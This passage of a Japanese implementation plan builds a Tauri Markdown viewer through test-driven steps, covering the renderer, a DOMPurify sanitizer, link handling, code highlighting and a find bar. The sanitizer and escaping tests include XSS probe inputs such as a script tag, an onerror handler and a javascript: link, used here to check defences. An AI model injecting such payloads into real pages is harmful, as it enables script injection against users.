    href.startsWith("http") ? "external" : href.startsWith("#") ? "anchor" : "local-file",
}));

import { renderDocument } from "./renderer";
import type { LoadedFile } from "../types";

function parse(html: string): Document {
  return new DOMParser().parseFromString(html, "text/html");
}

function md(text: string): LoadedFile {
  return { path: "/docs/a.md", text, encoding: "UTF-8", kind: "Markdown" };
}

describe("renderDocument (Markdown)", () => {
  beforeEach(() => vi.clearAllMocks());

  it("wraps the rendered Markdown in a .markdown-body element", () => {
    const doc = parse(renderDocument(md("# Hello"), "/docs"));
    const body = doc.querySelector(".markdown-body");
    expect(body).not.toBeNull();
    // The heading lives inside the wrapper.
    expect(body?.querySelector("h1")?.textContent).toBe("Hello");
  });

  it("renders a heading to <h1>", () => {
    const doc = parse(renderDocument(md("# Hello"), "/docs"));
    const h1 = doc.querySelector("h1");
    expect(h1?.textContent).toBe("Hello");
  });

  it("renders a GFM table to <table> with <th> and <td>", () => {
    const src = "| A | B |\n| - | - |\n| 1 | 2 |";
    const doc = parse(renderDocument(md(src), "/docs"));
    expect(doc.querySelector("table")).not.toBeNull();
    expect(doc.querySelector("th")?.textContent).toBe("A");
    expect(doc.querySelector("td")?.textContent).toBe("1");
  });

  it("renders a task list with checkbox inputs", () => {
    const src = "- [ ] todo\n- [x] done";
    const doc = parse(renderDocument(md(src), "/docs"));
    const checkboxes = doc.querySelectorAll('input[type="checkbox"]');
    expect(checkboxes.length).toBe(2);
    expect((checkboxes[1] as HTMLInputElement).hasAttribute("checked")).toBe(true);
  });

  it("renders a footnote reference and definition", () => {
    const src = "Text with a note.[^1]\n\n[^1]: the note";
    const doc = parse(renderDocument(md(src), "/docs"));
    expect(doc.querySelector("sup.footnote-ref")).not.toBeNull();
    expect(doc.querySelector(".footnotes")).not.toBeNull();
  });

  it("rewrites local image src via resolveImageSrc with baseDir", () => {
    const doc = parse(renderDocument(md("![alt](pic.png)"), "/docs"));
    const img = doc.querySelector("img");
    expect(img?.getAttribute("src")).toBe("RESOLVED(/docs|pic.png)");
    expect(img?.getAttribute("alt")).toBe("alt");
  });

  it("leaves remote image src unchanged through resolveImageSrc", () => {
    const doc = parse(renderDocument(md("![r](https://x.test/p.png)"), "/docs"));
    expect(doc.querySelector("img")?.getAttribute("src")).toBe("https://x.test/p.png");
  });
});
```

Run:
```bash
npx vitest run src/markdown/renderer.test.ts
```
Expected: FAIL（`./renderer` が存在しない）。
```
Error: Failed to resolve import "./renderer" from "src/markdown/renderer.test.ts"
```

- [ ] **Step 2: renderer のプレーンテキスト エスケープ テストを書く（失敗）**

プレーンテキストは `<pre class="plaintext">` に包み、`<script>` 等が実行可能なタグではなくテキストとして現れることを検証する。`sanitize` はモックで恒等なので、エスケープが renderer 側で行われていることを確かめられる。

`src/markdown/renderer.test.ts`（同ファイルに describe を追記）:
```ts
function txt(text: string): LoadedFile {
  return { path: "/docs/a.txt", text, encoding: "UTF-8", kind: "PlainText" };
}

describe("renderDocument (PlainText)", () => {
  it("wraps text in <pre class=plaintext>", () => {
    const doc = parse(renderDocument(txt("hello\nworld"), "/docs"));
    const pre = doc.querySelector("pre.plaintext");
    expect(pre).not.toBeNull();
    expect(pre?.textContent).toBe("hello\nworld");
  });

  it("escapes script tags so they are shown literally, not executed", () => {
    const html = renderDocument(txt("<script>alert(1)</script>"), "/docs");
    expect(html).toContain("&lt;script&gt;");
    expect(html).not.toContain("<script>");
    const doc = parse(html);
    expect(doc.querySelector("script")).toBeNull();
    expect(doc.querySelector("pre.plaintext")?.textContent).toBe(
      "<script>alert(1)</script>",
    );
  });

  it("escapes ampersands and angle brackets", () => {
    const html = renderDocument(txt("a & b < c > d"), "/docs");
    expect(html).toContain("a &amp; b &lt; c &gt; d");
  });
});
```

Run:
```bash
npx vitest run src/markdown/renderer.test.ts
```
Expected: FAIL（同上、`./renderer` 未解決）。
```
Error: Failed to resolve import "./renderer" from "src/markdown/renderer.test.ts"
```

- [ ] **Step 3: src/markdown/renderer.ts を実装する**

markdown-it を `{ html:true, linkify:true, typographer:false }` で構成し、`markdown-it-task-lists`（`enabled` でラベルにチェックボックスを描画）と `markdown-it-footnote` を `.use()` する。GFM の表・打消し線は markdown-it に組み込みのため追加プラグイン不要。Markdown を HTML 化した後、jsdom（テスト）/WebView（本番）双方で使える `DOMParser` で一旦パースし、`img` の `src` を `resolveImageSrc` で書き換えてから直列化し、`sanitize` に渡す。プレーンテキストは `escapeHtml`（私的ヘルパー）でエスケープして `<pre class="plaintext">` に包み、`sanitize` に渡す。

`src/markdown/renderer.ts`:
```ts
import MarkdownIt from "markdown-it";
import taskLists from "markdown-it-task-lists";
import footnote from "markdown-it-footnote";
import type { LoadedFile } from "../types";
import { sanitize } from "./sanitize";
import { resolveImageSrc } from "./links";

const md: MarkdownIt = new MarkdownIt({
  html: true,
  linkify: true,
  typographer: false,
})
  .use(taskLists, { enabled: true, label: true })
  .use(footnote);

function escapeHtml(text: string): string {
  return text
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

function rewriteImageSources(html: string, baseDir: string): string {
  const doc = new DOMParser().parseFromString(html, "text/html");
  for (const img of Array.from(doc.querySelectorAll("img"))) {
    const src = img.getAttribute("src");
    if (src !== null) {
      img.setAttribute("src", resolveImageSrc(src, baseDir));
    }
  }
  return doc.body.innerHTML;
}

export function renderDocument(file: LoadedFile, baseDir: string): string {
  if (file.kind === "Markdown") {
    const rendered = md.render(file.text);
    const rewritten = rewriteImageSources(rendered, baseDir);
    // Wrap in .markdown-body so Task 16 CSS (`.markdown-body ...`) applies.
    return `<div class="markdown-body">${sanitize(rewritten)}</div>`;
  }
  return sanitize(`<pre class="plaintext">${escapeHtml(file.text)}</pre>`);
}
```

Run:
```bash
npx vitest run src/markdown/renderer.test.ts
```
Expected: PASS。
```
Test Files  1 passed (1)
     Tests  10 passed (10)
```

- [ ] **Step 4: 型チェックを実行する**

`markdown-it-task-lists` / `markdown-it-footnote` は型定義同梱が不完全な場合があるため、不足時は最小の型宣言を追加して `tsc` を通す。まず素で実行し、エラーが出たら declaration を足す。

Run:
```bash
npx tsc --noEmit -p tsconfig.json
```
Expected（型定義が無い旨のエラーが出る場合の例）:
```
src/markdown/renderer.ts: error TS7016: Could not find a declaration file for module 'markdown-it-task-lists'.
```

- [ ] **Step 5: 不足するプラグインの型宣言を追加する**

`src/markdown/markdown-it-plugins.d.ts` を作り、最小の `PluginSimple`/`PluginWithOptions` 型として宣言する（`footnote` は `@types` が無く、`task-lists` も同様の場合がある。両方を網羅的に宣言しておく）。

`src/markdown/markdown-it-plugins.d.ts`:
```ts
declare module "markdown-it-task-lists" {
  import type { PluginWithOptions } from "markdown-it";
  interface TaskListsOptions {
    enabled?: boolean;
    label?: boolean;
    lineNumber?: boolean;
  }
  const plugin: PluginWithOptions<TaskListsOptions>;
  export default plugin;
}

declare module "markdown-it-footnote" {
  import type { PluginSimple } from "markdown-it";
  const plugin: PluginSimple;
  export default plugin;
}
```

Run:
```bash
npx tsc --noEmit -p tsconfig.json
```
Expected: PASS（出力なし = 型エラーなし）。

- [ ] **Step 6: renderer テストと既存テストを通しで再実行する**

Run:
```bash
npx vitest run src/markdown/renderer.test.ts src/types.test.ts src/main.test.ts
```
Expected: PASS。
```
Test Files  3 passed (3)
     Tests  17 passed (17)
```

- [ ] **Step 7: コミットする**

```bash
git add src/markdown/renderer.ts src/markdown/renderer.test.ts src/markdown/markdown-it-plugins.d.ts
git commit -m "feat(renderer): render Markdown (GFM tables, task lists, footnotes) and escaped plaintext via sanitize"
```

### Task 10: HTML サニタイズ（DOMPurify）

このタスクでは描画済み HTML を DOMPurify で無害化する `sanitize()` を TDD で実装する。XSS（`<script>` / `on*` ハンドラ / `javascript:` href）を確実に除去しつつ、Markdown 由来の標準タグ・タスクリストのチェックボックスは温存することを保証する。前提として、足場タスク（package.json / vitest.config.ts / tsconfig.json）で `dompurify` v3 が導入済みで、Vitest が jsdom 環境で動くこと。`src/types.ts` の `LoadedFile` / `FileKind` は既存とする。

- [ ] **Step 1: sanitize の失敗テストを書く**

テスト先行。`<script>` 除去・`onerror` 除去・`javascript:` href 除去・許可タグ温存・タスクリスト用 `<input type=checkbox disabled>` 温存を一度に検証する。

`src/markdown/sanitize.test.ts` を新規作成する。

```ts
import { describe, it, expect } from "vitest";
import { sanitize } from "./sanitize";

describe("sanitize", () => {
  it("strips <script> tags entirely", () => {
    const out = sanitize('<p>hi</p><script>alert(1)</script>');
    expect(out).toContain("<p>hi</p>");
    expect(out.toLowerCase()).not.toContain("<script");
    expect(out).not.toContain("alert(1)");
  });

  it("removes inline event handlers like onerror", () => {
    const out = sanitize('<img src="x" onerror="alert(1)">');
    expect(out.toLowerCase()).not.toContain("onerror");
    expect(out).not.toContain("alert(1)");
  });

  it("drops javascript: hrefs", () => {
    const out = sanitize('<a href="javascript:alert(1)">x</a>');
    expect(out.toLowerCase()).not.toContain("javascript:");
  });

  it("strips <style> blocks", () => {
    const out = sanitize('<style>body{display:none}</style><p>ok</p>');
    expect(out.toLowerCase()).not.toContain("<style");
    expect(out).toContain("<p>ok</p>");
  });

  it("keeps standard markdown formatting", () => {
    const html =
      '<h1>T</h1><p><strong>b</strong> <em>i</em> <del>s</del> ' +
      '<a href="https://example.com">l</a></p>' +
      '<ul><li>x</li></ul><pre><code class="language-js">1</code></pre>' +
      '<table><thead><tr><th>h</th></tr></thead>' +
      '<tbody><tr><td>d</td></tr></tbody></table>';
    const out = sanitize(html);
    expect(out).toContain("<h1>T</h1>");
    expect(out).toContain("<strong>b</strong>");
    expect(out).toContain("<em>i</em>");
    expect(out).toContain("<del>s</del>");
    expect(out).toContain("<table>");
    expect(out).toContain('<code class="language-js">');
  });

  it("preserves anchor target/rel attributes", () => {
    const out = sanitize(
      '<a href="https://example.com" target="_blank" rel="noopener">x</a>',
    );
    expect(out).toContain('target="_blank"');
    expect(out).toContain('rel="noopener"');
  });

  it("preserves disabled task-list checkboxes", () => {
    const out = sanitize('<input type="checkbox" disabled checked>');
    expect(out.toLowerCase()).toContain('type="checkbox"');
    expect(out.toLowerCase()).toContain("disabled");
  });
});
```

Run: `npx vitest run src/markdown/sanitize.test.ts`
Expected: FAIL（`Failed to resolve import "./sanitize"` — モジュール未作成）。

- [ ] **Step 2: sanitize.ts を最小実装する**

DOMPurify のデフォルト（安全側）設定をベースに、`<a>` の `target`/`rel` を許可するため `ADD_ATTR` を付与する。`<input type=checkbox disabled>` は GFM タスクリスト用に許可する。`script`/`style` と `on*` 属性はデフォルトで除去されるが、明示的に `FORBID_TAGS` / `FORBID_ATTR` も指定して意図を固定する。

`src/markdown/sanitize.ts` を新規作成する。

```ts
import DOMPurify from "dompurify";

/**
 * Sanitize rendered HTML before injecting into the document.
 * - Forbids <script>/<style> and all inline on* event handlers.
 * - Allows standard markdown tags, a[target,rel], img[src,alt,title],
 *   code/pre[class], and disabled task-list checkboxes.
 */
export function sanitize(html: string): string {
  return DOMPurify.sanitize(html, {
    ADD_ATTR: ["target", "rel"],
    ADD_TAGS: ["input"],
    FORBID_TAGS: ["script", "style"],
    FORBID_ATTR: ["onerror", "onload", "onclick"],
  });
}
```

Run: `npx vitest run src/markdown/sanitize.test.ts`
Expected: PASS（7 tests passed）。

- [ ] **Step 3: Task 10 をコミットする**

```bash
git add src/markdown/sanitize.ts src/markdown/sanitize.test.ts
git commit -m "feat: add DOMPurify-based HTML sanitizer for rendered markdown"
```

Run: `git log --oneline -1`
Expected: `feat: add DOMPurify-based HTML sanitizer for rendered markdown`

### Task 11: リンク分類・画像 src 解決とアンカークリック委譲

このタスクでは `classifyLink()`（`#` 始まり=anchor、`http(s)://` または `//` 始まり=external、それ以外=local-file）と `resolveImageSrc()`（http/https/data は不変、相対は `convertFileSrc(join(baseDir, src))`）を TDD で実装する。さらに `main.ts` に `#content` 上のアンカークリックを委譲するハンドラを追加し、external は `invoke("open_external")`、local-file は `invoke("open_in_new_window")`、anchor は文書内スクロールに振り分ける。`@tauri-apps/api/core` の `convertFileSrc` / `invoke` を使う。

- [ ] **Step 1: classifyLink / resolveImageSrc の失敗テストを書く**

テスト先行。`convertFileSrc` は Tauri ランタイム依存なので `vi.mock` でスタブし、`baseDir` + `src` の結合結果がそのまま渡ること（posix/win 区切りの結合）を検証する。

`src/markdown/links.test.ts` を新規作成する。

```ts
import { describe, it, expect, vi, beforeEach } from "vitest";

vi.mock("@tauri-apps/api/core", () => ({
  convertFileSrc: (p: string) => `asset://localhost/${encodeURIComponent(p)}`,
}));

import { classifyLink, resolveImageSrc } from "./links";

describe("classifyLink", () => {
  it("classifies anchors", () => {
    expect(classifyLink("#section")).toBe("anchor");
  });
  it("classifies http/https as external", () => {
    expect(classifyLink("http://example.com")).toBe("external");
    expect(classifyLink("https://example.com/x")).toBe("external");
  });
  it("classifies protocol-relative // as external", () => {
    expect(classifyLink("//cdn.example.com/a.png")).toBe("external");
  });
  it("classifies relative paths as local-file", () => {
    expect(classifyLink("./other.md")).toBe("local-file");
    expect(classifyLink("../docs/x.md")).toBe("local-file");
    expect(classifyLink("notes.txt")).toBe("local-file");
  });
});

describe("resolveImageSrc", () => {
  it("leaves http/https/data URLs unchanged", () => {
    expect(resolveImageSrc("https://e.com/a.png", "/base")).toBe(
      "https://e.com/a.png",
    );
    expect(resolveImageSrc("http://e.com/a.png", "/base")).toBe(
      "http://e.com/a.png",
    );
    expect(resolveImageSrc("data:image/png;base64,AAAA", "/base")).toBe(
      "data:image/png;base64,AAAA",
    );
  });

  it("joins baseDir and relative src then wraps with convertFileSrc (posix)", () => {
    const out = resolveImageSrc("img/a.png", "/home/u/docs");
    expect(out).toBe(
      `asset://localhost/${encodeURIComponent("/home/u/docs/img/a.png")}`,
    );
  });

  it("strips a leading ./ before joining", () => {
    const out = resolveImageSrc("./a.png", "/home/u/docs");
    expect(out).toBe(
      `asset://localhost/${encodeURIComponent("/home/u/docs/a.png")}`,
    );
  });

  it("joins using a windows-style baseDir separator", () => {
    const out = resolveImageSrc("img\\a.png", "C:\\docs");
    expect(out).toBe(
      `asset://localhost/${encodeURIComponent("C:\\docs\\img\\a.png")}`,
    );
  });
});
```

Run: `npx vitest run src/markdown/links.test.ts`
Expected: FAIL（`Failed to resolve import "./links"` — モジュール未作成）。

- [ ] **Step 2: links.ts を最小実装する**

`joinPath` は private ヘルパー。`baseDir` の区切り文字（`\` を含むなら Windows 区切り、なければ posix `/`）を検出して結合する。`src` 内の `\` は同じ区切りに正規化し、先頭の `./` は除去する。

`src/markdown/links.ts` を新規作成する。

```ts
import { convertFileSrc } from "@tauri-apps/api/core";

/** Classify a link href into how the app should handle it. */
export function classifyLink(href: string): "external" | "anchor" | "local-file" {
  if (href.startsWith("#")) return "anchor";
  if (/^https?:\/\//i.test(href) || href.startsWith("//")) return "external";
  return "local-file";
}

/** Join baseDir and a relative path using baseDir's separator convention. */
function joinPath(baseDir: string, rel: string): string {
  const sep = baseDir.includes("\\") ? "\\" : "/";
  // Normalize the relative part's separators and drop a leading "./".
  let cleaned = rel.replace(/[\\/]+/g, sep);
  if (cleaned.startsWith(`.${sep}`)) cleaned = cleaned.slice(2);
  const base = baseDir.endsWith(sep) ? baseDir.slice(0, -1) : baseDir;
  return `${base}${sep}${cleaned}`;
}

/**
 * Resolve an <img> src for display.
 * - http(s):// and data: URLs are returned unchanged.
 * - Anything else is joined onto baseDir and wrapped with convertFileSrc,
 *   scoping local assets to the opened file's directory.
 */
export function resolveImageSrc(src: string, baseDir: string): string {
  if (/^https?:\/\//i.test(src) || src.startsWith("data:")) return src;
  return convertFileSrc(joinPath(baseDir, src));
}
```

Run: `npx vitest run src/markdown/links.test.ts`
Expected: PASS（9 tests passed）。

- [ ] **Step 3: #content のアンカークリック委譲の失敗テストを書く**

`main.ts` の本体は他タスクで定義済みのため、クリック委譲ロジックは単体テスト可能な純関数 `handleContentClick(event, baseDir, deps)` として `src/ui/contentClick.ts` に切り出し、`main.ts` から配線する。まず切り出した関数の失敗テストを書く。`invoke` は `deps` 経由で注入してテストする。

`src/ui/contentClick.test.ts` を新規作成する。

```ts
import { describe, it, expect, vi } from "vitest";
import { handleContentClick } from "./contentClick";

function clickOn(anchor: HTMLAnchorElement) {
  const root = document.createElement("div");
  root.appendChild(anchor);
  document.body.appendChild(root);
  const ev = new MouseEvent("click", { bubbles: true, cancelable: true });
  Object.defineProperty(ev, "target", { value: anchor });
  return ev;
}

describe("handleContentClick", () => {
  it("opens external links via open_external and prevents default", () => {
    const a = document.createElement("a");
    a.href = "https://example.com/";
    const invoke = vi.fn().mockResolvedValue(undefined);
    const ev = clickOn(a);
    handleContentClick(ev, "/base", { invoke });
    expect(invoke).toHaveBeenCalledWith("open_external", {
      url: "https://example.com/",
    });
    expect(ev.defaultPrevented).toBe(true);
  });

  it("opens local files in a new window with the joined path", () => {
    const a = document.createElement("a");
    a.setAttribute("href", "other.md");
    const invoke = vi.fn().mockResolvedValue("doc-2");
    const ev = clickOn(a);
    handleContentClick(ev, "/home/u/docs", { invoke });
    expect(invoke).toHaveBeenCalledWith("open_in_new_window", {
      path: "/home/u/docs/other.md",
    });
    expect(ev.defaultPrevented).toBe(true);
  });

  it("scrolls anchors into view without invoking commands", () => {
    const target = document.createElement("h2");
    target.id = "sec";
    document.body.appendChild(target);
    const scroll = vi.fn();
    target.scrollIntoView = scroll;
    const a = document.createElement("a");
    a.setAttribute("href", "#sec");
    const invoke = vi.fn();
    const ev = clickOn(a);
    handleContentClick(ev, "/base", { invoke });
    expect(invoke).not.toHaveBeenCalled();
    expect(scroll).toHaveBeenCalled();
    expect(ev.defaultPrevented).toBe(true);
  });

  it("ignores clicks that are not on an anchor", () => {
    const span = document.createElement("span");
    const root = document.createElement("div");
    root.appendChild(span);
    const ev = new MouseEvent("click", { bubbles: true, cancelable: true });
    Object.defineProperty(ev, "target", { value: span });
    const invoke = vi.fn();
    handleContentClick(ev, "/base", { invoke });
    expect(invoke).not.toHaveBeenCalled();
    expect(ev.defaultPrevented).toBe(false);
  });
});
```

Run: `npx vitest run src/ui/contentClick.test.ts`
Expected: FAIL（`Failed to resolve import "./contentClick"` — モジュール未作成）。

- [ ] **Step 4: contentClick.ts を最小実装する**

※ `handleContentClick`（`ui/contentClick.ts`）は契約に明記された公開シンボルではなく、テスト容易性のために main.ts のインライン配線を切り出した内部ヘルパ。内部では契約名の `classifyLink` を使う。

`classifyLink` で振り分け、external/local-file は `preventDefault` 後に `invoke`、anchor は対象要素を `scrollIntoView`。local-file のパスは `links.ts` の結合規約と一致させるため、`href` 属性の生値（`anchor.getAttribute("href")`）を使い、`joinPath` 相当の結合を `resolveLocalPath` で行う。

`src/ui/contentClick.ts` を新規作成する。

```ts
import { classifyLink } from "../markdown/links";

interface ClickDeps {
  invoke: (cmd: string, args?: Record<string, unknown>) => Promise<unknown>;
}

/** Join baseDir and a relative href using baseDir's separator convention. */
function resolveLocalPath(baseDir: string, rel: string): string {
  const sep = baseDir.includes("\\") ? "\\" : "/";
  let cleaned = rel.replace(/[\\/]+/g, sep);
  if (cleaned.startsWith(`.${sep}`)) cleaned = cleaned.slice(2);
  const base = baseDir.endsWith(sep) ? baseDir.slice(0, -1) : baseDir;
  return `${base}${sep}${cleaned}`;
}

/**
 * Delegated click handler for #content. Routes anchor clicks:
 * external => open_external, local-file => open_in_new_window, anchor => scroll.
 */
export function handleContentClick(
  event: MouseEvent,
  baseDir: string,
  deps: ClickDeps,
): void {
  const target = event.target as HTMLElement | null;
  const anchor = target?.closest?.("a") as HTMLAnchorElement | null;
  if (!anchor) return;
  const href = anchor.getAttribute("href");
  if (href === null) return;

  const kind = classifyLink(href);
  if (kind === "external") {
    event.preventDefault();
    void deps.invoke("open_external", { url: anchor.href });
    return;
  }
  if (kind === "local-file") {
    event.preventDefault();
    void deps.invoke("open_in_new_window", {
      path: resolveLocalPath(baseDir, href),
    });
    return;
  }
  // anchor
  event.preventDefault();
  const id = href.slice(1);
  const el = id ? document.getElementById(id) : null;
  el?.scrollIntoView();
}
```

Run: `npx vitest run src/ui/contentClick.test.ts`
Expected: PASS（4 tests passed）。

- [ ] **Step 5: main.ts に #content クリックハンドラを配線する**

※ ここで示す main.ts 断片は段階的な途中形。最終的な統合済み main.ts は Task 15 Step 12 を正とする（差分はそこで吸収）。

`main.ts` のブートストラップ（他タスクで定義済み）に、`#content` 要素へ委譲リスナーを 1 行で取り付ける。`baseDir` は読み込んだファイルのディレクトリ。`@tauri-apps/api/core` の `invoke` を渡す。`handleContentClick` は契約に明記された公開シンボルではなく、テスト容易性のために main.ts のインライン配線を切り出した内部ヘルパであり、内部で契約名の `classifyLink` を使う。

`src/main.ts` の import 群に追記する。

```ts
import { invoke } from "@tauri-apps/api/core";
import { handleContentClick } from "./ui/contentClick";
```

`src/main.ts` のブートストラップ内、`#content` へレンダリングした直後（`baseDir` が確定している箇所）に以下を追記する。

```ts
const contentEl = document.getElementById("content");
if (contentEl) {
  contentEl.addEventListener("click", (event) =>
    handleContentClick(event, baseDir, { invoke }),
  );
}
```

Run: `npx tsc --noEmit`
Expected: 型エラーなし（exit 0）。

- [ ] **Step 6: Task 11 をコミットする**

```bash
git add src/markdown/links.ts src/markdown/links.test.ts src/ui/contentClick.ts src/ui/contentClick.test.ts src/main.ts
git commit -m "feat: classify links, resolve scoped image src, and delegate content clicks"
```

Run: `git log --oneline -1`
Expected: `feat: classify links, resolve scoped image src, and delegate content clicks`

### Task 12: コードハイライトの遅延ロード

このタスクでは契約シグネチャ `highlightAll(root: HTMLElement): Promise<void>`（1 引数）を TDD で実装する。`root` 内に `pre code` が無ければ即 return し、highlight.js の動的 import を一切呼ばない（起動軽量化の保証）。コードブロックがある場合のみ `import("highlight.js")` し、各要素を `highlightElement` する。テスト容易性のため、importer を注入できる `highlightAllWith(root, importer)` を分離し、`highlightAll(root)` はデフォルト importer でそれへ委譲する。テストは `highlightAllWith` に spy を渡して検証し、本番の呼び出し側は契約名 `highlightAll(root)` を使う。前提として `highlight.js` v11 が導入済み。

- [ ] **Step 1: highlightAllWith の失敗テストを書く**

テスト先行。`highlightAllWith` は第 2 引数に importer を受け取る設計で、テストでは spy を渡す。コードブロック無し→importer 未呼び出し、有り→`hljs` クラス付与と importer 1 回呼び出しを検証する。

`src/markdown/highlight.test.ts` を新規作成する。

```ts
import { describe, it, expect, vi } from "vitest";
import { highlightAllWith } from "./highlight";

function makeImporter() {
  const highlightElement = vi.fn((el: HTMLElement) => {
    el.classList.add("hljs");
  });
  const importer = vi.fn(async () => ({
    default: { highlightElement },
  }));
  return { importer, highlightElement };
}

describe("highlightAllWith", () => {
  it("does NOT import highlight.js when there are no code blocks", async () => {
    const root = document.createElement("div");
    root.innerHTML = "<p>no code here</p>";
    const { importer } = makeImporter();
    await highlightAllWith(root, importer);
    expect(importer).not.toHaveBeenCalled();
  });

  it("imports once and highlights each pre>code element", async () => {
    const root = document.createElement("div");
    root.innerHTML =
      '<pre><code class="language-js">1</code></pre>' +
      '<pre><code class="language-ts">2</code></pre>';
    const { importer, highlightElement } = makeImporter();
    await highlightAllWith(root, importer);
    expect(importer).toHaveBeenCalledTimes(1);
    expect(highlightElement).toHaveBeenCalledTimes(2);
    const blocks = root.querySelectorAll("pre code");
    blocks.forEach((b) => expect(b.classList.contains("hljs")).toBe(true));
  });
});
```

Run: `npx vitest run src/markdown/highlight.test.ts`
Expected: FAIL（`Failed to resolve import "./highlight"` — モジュール未作成）。

- [ ] **Step 2: highlight.ts を最小実装する**

`pre code` を先に query し、空なら即 return（動的 import に到達させない）。要素があるときだけ importer を呼ぶ。デフォルト importer は `import("highlight.js")`。highlight.js の型は実行時のみ必要なので最小の構造を `HljsModule` として記述する。

`src/markdown/highlight.ts` を新規作成する。契約上の公開シグネチャは `highlightAll(root: HTMLElement): Promise<void>` の 1 引数。テスト容易性のため、importer 注入版 `highlightAllWith(root, importer)` を分離し、`highlightAll(root)` はデフォルト importer でそれに委譲する。`highlightAllWith` はテスト用に export するが、本番の呼び出し側（main.ts）は契約名の `highlightAll(root)` を使う。

```ts
interface HljsModule {
  default: { highlightElement: (el: HTMLElement) => void };
}

type HljsImporter = () => Promise<HljsModule>;

const defaultImporter: HljsImporter = () =>
  import("highlight.js") as unknown as Promise<HljsModule>;

/**
 * Test seam: highlight all `pre code` blocks under root using the given importer.
 * Returns immediately (without calling the importer) when there are none,
 * to keep startup light for documents with no code.
 */
export async function highlightAllWith(
  root: HTMLElement,
  importer: HljsImporter,
): Promise<void> {
  const blocks = root.querySelectorAll<HTMLElement>("pre code");
  if (blocks.length === 0) return;
  const hljs = (await importer()).default;
  blocks.forEach((block) => hljs.highlightElement(block));
}

/**
 * Public contract: highlight all `pre code` blocks under root, lazy-loading
 * highlight.js only when code blocks exist. Delegates to highlightAllWith.
 */
export function highlightAll(root: HTMLElement): Promise<void> {
  return highlightAllWith(root, defaultImporter);
}
```

Run: `npx vitest run src/markdown/highlight.test.ts`
Expected: PASS（2 tests passed）。

- [ ] **Step 3: フロント単体テスト全体を回して回帰がないことを確認する**

Run: `npx vitest run`
Expected: PASS（本エリアの sanitize / links / contentClick / highlight を含む全テストが green）。

- [ ] **Step 4: Task 12 をコミットする**

```bash
git add src/markdown/highlight.ts src/markdown/highlight.test.ts
git commit -m "feat: add lazy-loaded highlight.js integration gated on code blocks"
```

Run: `git log --oneline -1`
Expected: `feat: add lazy-loaded highlight.js integration gated on code blocks`

### Task 13: ドキュメント内検索バー（FindBar）

このタスクでは `src/ui/find.ts` の `FindBar` クラスを TDD で実装する。`FindBar` は `#content` 配下のテキストノードを走査し、マッチ箇所を `<mark class="find-hit">` で包む（CSS Custom Highlight API が使える場合はそれを使い、不可なら span/mark フォールバックを使う）。マッチ数を返し、現在インデックスを保持して `next()`/`prev()` で移動・スクロールし、`open()`/`close()` で `#findbar` 入力をトグルし、`close()` 時にハイライトを消す。jsdom はレイアウトを持たないが innerHTML / テキストノード / matchMedia は使えるため、フォールバック（span 包み）経路をテストする。最後に `main.ts` に Cmd/Ctrl+F のキーバインドを配線する。

- [ ] **Step 1: FindBar のフォールバック検索ロジックの失敗テストを書く**

`src/ui/find.test.ts` を新規作成する。何をするか: jsdom 上の content DOM に対し `search("foo")` がマッチ数を返し、各マッチを `mark.find-hit` で包むことを検証する。なぜ必要か: 検索の中核（テキストノード走査＋ハイライト）が純粋に DOM だけで成立することを保証するため。どう書くか:

```ts
// src/ui/find.test.ts
import { beforeEach, describe, expect, it, vi } from "vitest";
import { FindBar } from "./find";

function buildRoot(contentHtml: string): HTMLElement {
  document.body.innerHTML = `
    <div id="findbar" hidden>
      <input id="findbar-input" type="text" />
      <span id="findbar-count"></span>
    </div>
    <div id="content">${contentHtml}</div>
  `;
  return document.body;
}

beforeEach(() => {
  // Force the span/mark fallback path (CSS Custom Highlight API absent in jsdom anyway).
  // @ts-expect-error - ensure Highlight is undefined for the fallback branch.
  delete (globalThis as { Highlight?: unknown }).Highlight;
  document.body.innerHTML = "";
});

describe("FindBar.search", () => {
  it("counts matches and wraps them in mark.find-hit", () => {
    const root = buildRoot("<p>foo bar foo</p><p>baz foo</p>");
    const bar = new FindBar(root);
    bar.open();

    const count = bar.search("foo");

    expect(count).toBe(3);
    const marks = root.querySelectorAll("mark.find-hit");
    expect(marks.length).toBe(3);
    expect(marks[0].textContent).toBe("foo");
  });

  it("is case-insensitive and preserves surrounding text", () => {
    const root = buildRoot("<p>Foo and FOO and foo</p>");
    const bar = new FindBar(root);
    bar.open();

    const count = bar.search("foo");

    expect(count).toBe(3);
    expect(root.querySelector("#content")?.textContent).toBe("Foo and FOO and foo");
  });

  it("returns 0 and clears marks for an empty query", () => {
    const root = buildRoot("<p>foo</p>");
    const bar = new FindBar(root);
    bar.open();
    bar.search("foo");

    const count = bar.search("");

    expect(count).toBe(0);
    expect(root.querySelectorAll("mark.find-hit").length).toBe(0);
  });
});
```

- [ ] **Step 2: テストを実行して FAIL を確認する**

何をするか: まだ実装が無いことを確認する。なぜ必要か: TDD の Red を成立させるため。

Run:
```bash
npm run test -- src/ui/find.test.ts
```
Expected: `FAIL src/ui/find.test.ts` — `Failed to resolve import "./find"`（モジュール未作成のためインポート解決に失敗する）。

- [ ] **Step 3: FindBar の最小実装（search／open／close／clear）を書く**

何をするか: テキストノード走査でマッチを `mark.find-hit` に包むフォールバック実装を書く。なぜ必要か: Step 1 のテストを通すため。どう書くか:

```ts
// src/ui/find.ts
const HIT_CLASS = "find-hit";
const CURRENT_CLASS = "find-hit-current";

export class FindBar {
  private readonly root: HTMLElement;
  private query = "";
  private currentIndex = 0;

  constructor(root: HTMLElement) {
    this.root = root;
  }

  open(): void {
    const bar = this.findbarEl();
    if (bar) {
      bar.hidden = false;
    }
    this.inputEl()?.focus();
  }

  close(): void {
    const bar = this.findbarEl();
    if (bar) {
      bar.hidden = true;
    }
    this.clearHighlights();
    this.query = "";
    this.currentIndex = 0;
    const input = this.inputEl();
    if (input) {
      input.value = "";
    }
    this.renderCount(0);
  }

  search(query: string): number {
    this.clearHighlights();
    this.query = query;
    this.currentIndex = 0;
    if (query.length === 0) {
      this.renderCount(0);
      return 0;
    }
    const count = this.highlightMatches(query);
    if (count > 0) {
      this.setCurrent(0);
    }
    this.renderCount(count);
    return count;
  }

  next(): void {
    this.move(1);
  }

  prev(): void {
    this.move(-1);
  }

  private move(delta: number): void {
    const hits = this.hits();
    if (hits.length === 0) {
      return;
    }
    this.currentIndex = (this.currentIndex + delta + hits.length) % hits.length;
    this.setCurrent(this.currentIndex);
  }

  private setCurrent(index: number): void {
    const hits = this.hits();
    hits.forEach((hit, i) => {
      hit.classList.toggle(CURRENT_CLASS, i === index);
    });
    this.currentIndex = index;
